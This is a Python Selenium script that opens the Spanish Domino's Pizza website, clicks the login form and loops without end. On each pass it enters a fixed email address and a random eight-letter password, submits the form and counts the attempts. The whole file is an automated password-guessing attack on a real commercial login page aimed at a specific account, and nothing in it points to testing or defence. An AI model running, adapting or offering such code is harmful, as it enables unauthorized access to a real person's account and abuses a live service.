from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import Select
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.action_chains import ActionChains
import pyautogui
import time
import random
import string

PATH = "C:\Program Files (x86)\msedgedriver.exe"
driver = webdriver.Edge(PATH)

ascii_letras= "!#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[]^_`abcdefghijklmnopqrstuvwxyz{|}~"
driver.get("https://dominospizza.es")
login = driver.find_element_by_class_name("name")
login.click()


cont=0
while True:
	time.sleep(3)
	let=[random.choice(string.ascii_letters) for n in range(8)]
	intentos="".join(let)

	user = driver.find_element_by_id("txtUser")
	user.send_keys("david.cripto@hotmail.com")

	password = driver.find_element_by_id("txtPass")
	password.send_keys(let)

	time.sleep(1)

	enter = driver.find_element_by_id("btnLoginMenu")
	enter.click()

	time.sleep(1)

	user = driver.find_element_by_id("txtUser")
	user.clear()

	password = driver.find_element_by_id("txtPass")
	password.clear()


	cont = cont + 1
	print("contador: ", cont)

driver.close()


